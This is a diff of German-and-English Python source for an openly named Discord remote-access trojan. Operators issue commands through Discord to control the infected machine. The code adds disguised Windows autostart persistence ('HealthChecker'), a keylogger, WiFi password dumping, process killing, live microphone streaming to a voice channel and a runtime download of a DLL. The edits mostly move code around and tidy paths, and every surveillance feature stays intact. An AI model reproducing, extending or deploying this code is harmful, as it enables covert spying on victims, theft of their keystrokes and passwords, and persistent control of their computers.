@@ -59,6 +59,9 @@ SCRIPT_PATH = os.path.abspath(sys.argv[0])
 AUTOSTART_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
 AUTOSTART_NAME = "HealthChecker"
 
+# Erhalte das temporäre Verzeichnis des Systems
+temp_dir = tempfile.gettempdir()
+
 def is_authorized(ctx):
     return ctx.author.id in AUTHORIZED_USERS
 
@@ -174,7 +177,7 @@ async def on_ready():
         channel_ids['keylogger_channel'] = keylogger_channel.id
         print(f"Keylogger channel ID set to: {keylogger_channel.id}")
         
-        channel_ids['voice'] = 1334502408780255253
+        channel_ids['voice'] = YOUR_VOICE_CHANNEL_ID
         
         current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         # Send a message indicating that the bot is online
@@ -214,6 +217,7 @@ async def custom_help(ctx):
     `!wifi` - Shows WiFi profiles and passwords.
     `!system_info` - Shows system information.
     `!cpu_usage` - Shows the current CPU usage.
+    `!tasklist` - List's every running Process with Name and PID.
     `!taskkill <pid>` - Kills a process with the given PID.
     `!tts <message>` - Plays a custom text-to-speech message.
     `!mic_stream_start` - Starts a live stream of the microphone to a voice channel.
@@ -654,70 +658,6 @@ async def wifi(ctx):
     except Exception as e:
         await working_message.delete()
         await send_temporary_message(ctx, f'Fehler beim Abrufen der WLAN-Profile: {str(e)}', duration=10)
-
-# Function to download libopus if it doesn't exist in the temp directory
-def download_libopus():
-    url = "https://github.com/truelockmc/Discord-RAT/raw/refs/heads/main/libopus.dll"  # Ersetzen Sie dies durch eine vertrauenswürdige Quelle
-    temp_dir = tempfile.gettempdir()
-    opuslib_path = os.path.join(temp_dir, 'libopus.dll')
-
-    if not os.path.exists(opuslib_path):
-        response = requests.get(url)
-        with open(opuslib_path, 'wb') as file:
-            file.write(response.content)
-        print(f"{opuslib_path} heruntergeladen.")
-
-    return opuslib_path
-
-# Load Opus library
-opuslib_path = download_libopus()
-discord.opus.load_opus(opuslib_path)
-
-# PyAudioPCM class for streaming audio from the microphone
-class PyAudioPCM(discord.AudioSource):
-    def __init__(self, channels=2, rate=48000, chunk=960, input_device=None) -> None:
-        p = pyaudio.PyAudio()
-        self.chunks = chunk
-        self.input_stream = p.open(format=pyaudio.paInt16, channels=channels, rate=rate, input=True, input_device_index=input_device, frames_per_buffer=chunk)
-    def read(self) -> bytes:
-        return self.input_stream.read(self.chunks)
-
-# Bot command to join voice channel and stream microphone audio
-@bot.command()
-@commands.check(is_authorized)
-async def mic_stream_start(ctx):
-    if not in_correct_channel(ctx):
-        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
-        return
-
-    # Ensure 'voice' key exists in channel_ids
-    if 'voice' not in channel_ids:
-        await ctx.send(f"`[{current_time()}] Voice-Channel ID ist nicht gesetzt.`", delete_after=10)
-        return
-
-    voice_channel = discord.utils.get(ctx.guild.voice_channels, id=channel_ids['voice'])
-    if voice_channel is None:
-        await ctx.send(f"`[{current_time()}] Voice-Channel nicht gefunden.`", delete_after=10)
-        return
-
-    vc = await voice_channel.connect(self_deaf=True)
-    vc.play(PyAudioPCM())
-    await ctx.send(f"`[{current_time()}] Joined voice-channel and streaming microphone in realtime`")
-
-    # Log messages (you can replace these with actual logging if needed)
-    print(f"[{current_time()}] Connected to voice channel")
-    print(f"[{current_time()}] Started playing audio from microphone's input")
-
-# Bot command to leave the voice channel
-@bot.command()
-@commands.check(is_authorized)
-async def mic_stream_stop(ctx):
-    if ctx.voice_client is None:
-        await ctx.send(f"`[{current_time()}] Bot ist in keinem Voice-Channel.`", delete_after=10)
-        return
-
-    await ctx.voice_client.disconnect()
-    await ctx.send(f"`[{current_time()}] Left voice-channel.`", delete_after=10)
     
 # Global variables for keylogging
 files_to_send, messages_to_send, embeds_to_send = [], [], []
@@ -730,11 +670,11 @@ ctrl_codes = {
 }
 keylogger_active = False
 keylogger_thread = None
-status_file = 'keylogger_status.json'
+status_file = os.path.join(temp_dir, 'keylogger_status.json')
 
 # Function to get the current time
 def current_time():
-    return datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    return datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
 # Function to create a channel if it does not exist
 async def create_channel_if_not_exists(guild, channel_name):
@@ -866,7 +806,7 @@ async def keylog(ctx, action=None):
             print("Keylogger wurde deaktiviert.")
     else:
         await log_message(ctx, '❌ **Ungültige Aktion. Verwenden Sie `!keylog on` oder `!keylog off`.**', duration=10)
-        
+
 @bot.command()
 @commands.check(is_authorized)
 async def tts(ctx, *, message):
@@ -888,6 +828,70 @@ async def tts_error(ctx, error):
         await log_message(ctx, '❌ **Fehler:** Ein erforderliches Argument fehlt. Bitte geben Sie eine Nachricht an.', duration=10)
     else:
         await log_message(ctx, f'❌ **Fehler:** {str(error)}', duration=10)
+        
+# Function to download libopus if it doesn't exist in the temp directory
+def download_libopus():
+    url = "https://github.com/truelockmc/Discord-RAT/raw/refs/heads/main/libopus.dll"  # Ersetzen Sie dies durch eine vertrauenswürdige Quelle
+    temp_dir = tempfile.gettempdir()
+    opuslib_path = os.path.join(temp_dir, 'libopus.dll')
+
+    if not os.path.exists(opuslib_path):
+        response = requests.get(url)
+        with open(opuslib_path, 'wb') as file:
+            file.write(response.content)
+        print(f"{opuslib_path} heruntergeladen.")
+
+    return opuslib_path
+
+# Load Opus library
+opuslib_path = download_libopus()
+discord.opus.load_opus(opuslib_path)
+
+# PyAudioPCM class for streaming audio from the microphone
+class PyAudioPCM(discord.AudioSource):
+    def __init__(self, channels=2, rate=48000, chunk=960, input_device=None) -> None:
+        p = pyaudio.PyAudio()
+        self.chunks = chunk
+        self.input_stream = p.open(format=pyaudio.paInt16, channels=channels, rate=rate, input=True, input_device_index=input_device, frames_per_buffer=chunk)
+    def read(self) -> bytes:
+        return self.input_stream.read(self.chunks)
+
+# Bot command to join voice channel and stream microphone audio
+@bot.command()
+@commands.check(is_authorized)
+async def mic_stream_start(ctx):
+    if not in_correct_channel(ctx):
+        await send_temporary_message(ctx, "Dieser Befehl kann nur im spezifischen Channel für diesen PC ausgeführt werden.", duration=10)
+        return
+
+    # Ensure 'voice' key exists in channel_ids
+    if 'voice' not in channel_ids:
+        await ctx.send(f"`[{current_time()}] Voice-Channel ID ist nicht gesetzt.`", delete_after=10)
+        return
+
+    voice_channel = discord.utils.get(ctx.guild.voice_channels, id=channel_ids['voice'])
+    if voice_channel is None:
+        await ctx.send(f"`[{current_time()}] Voice-Channel nicht gefunden.`", delete_after=10)
+        return
+
+    vc = await voice_channel.connect(self_deaf=True)
+    vc.play(PyAudioPCM())
+    await ctx.send(f"`[{current_time()}] Joined voice-channel and streaming microphone in realtime`")
+
+    # Log messages (you can replace these with actual logging if needed)
+    print(f"[{current_time()}] Connected to voice channel")
+    print(f"[{current_time()}] Started playing audio from microphone's input")
+
+# Bot command to leave the voice channel
+@bot.command()
+@commands.check(is_authorized)
+async def mic_stream_stop(ctx):
+    if ctx.voice_client is None:
+        await ctx.send(f"`[{current_time()}] Bot ist in keinem Voice-Channel.`", delete_after=10)
+        return
+
+    await ctx.voice_client.disconnect()
+    await ctx.send(f"`[{current_time()}] Left voice-channel.`", delete_after=10)
 
 def main():
     time.sleep(15)
